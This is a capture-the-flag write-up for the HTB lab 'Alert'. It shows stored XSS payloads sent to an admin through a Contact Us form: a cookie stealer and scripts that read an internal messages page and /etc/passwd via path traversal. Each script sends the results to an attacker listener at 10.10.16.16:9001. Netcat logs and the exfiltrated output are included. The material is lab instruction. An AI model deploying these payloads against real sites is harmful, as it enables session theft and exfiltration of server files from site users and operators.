
# Alert 

domain enum: http://alert.htb/


**markdown exploits**

resource: https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt

**Markdown viewers are often vulnerable to XSS.
```
<script>
    alert(1)
</script>
```

**Steal page content via XSS
 - Our administrator is in charge of reviewing contact messages and reporting errors 

 - So we need to send a XSS payload to admin via “Contact Us” page. Let’s modify our payload and make it more complex. A cookie stealer:
 ```
 <script>
    fetch('http://<<your-ip>>:9001/', {
              method: 'POST',
              mode: 'no-cors',
              body:document.cookie
        });
</script>
```
- When we set a listner we can get trace back the above payload and it gives a result

```
kali@kali:~/Desktop/htb/alert$ nc -lnvp 9001                                  
listening on [any] 9001 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.11.44] 34572
POST / HTTP/1.1
Host: 10.10.16.16:9001
Connection: keep-alive
Content-Length: 0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://alert.htb
Referer: http://alert.htb/
Accept-Encoding: gzip, deflate
```
- No cookie is the request body. 
- It would be nice to view the messages page but in another way. Let’s make the payload even more complex to steal a page content:

```
<script>
  var url = "http://alert.htb/index.php?page=messages"
  var attacker = "http://10.10.16.16:9001/exfil"
  var xhr = new XMLHttpRequest()
  xhr.onreadystatechange = function () {
    if (xhr.readyState == XMLHttpRequest.DONE) {
      fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
  }
  xhr.open("GET", url, true)
  xhr.send(null)
</script>
```
- data grabbed comes in query of named exfil and is EncodedURI and base64 encoded
```
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg==
```
when decoded:
Alert - Markdown Viewer
Markdown Viewer
Contact Us
About Us
Donate
Messages 
```   
Messages2024-03-10_15-48-34.txt
```
© 2024 Alert. All rights reserved.


http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt

- Blank page. The ?file= parameter looks suspicions. We can try a directory traversal. 
- Modify the payload to see the /etc/passwd
```
<script>
    var url = "messages.php?file=../../../../../../../etc/passwd"
    var attacker = "http://10.10.16.16:9001/exfil"
    var xhr = new XMLHttpRequest()
    xhr.onreadystatechange = function () {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
      }
    }
    xhr.open("GET", url, true)
    xhr.send(null)
</script>
```
- Now we use path traversal and get 
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
```


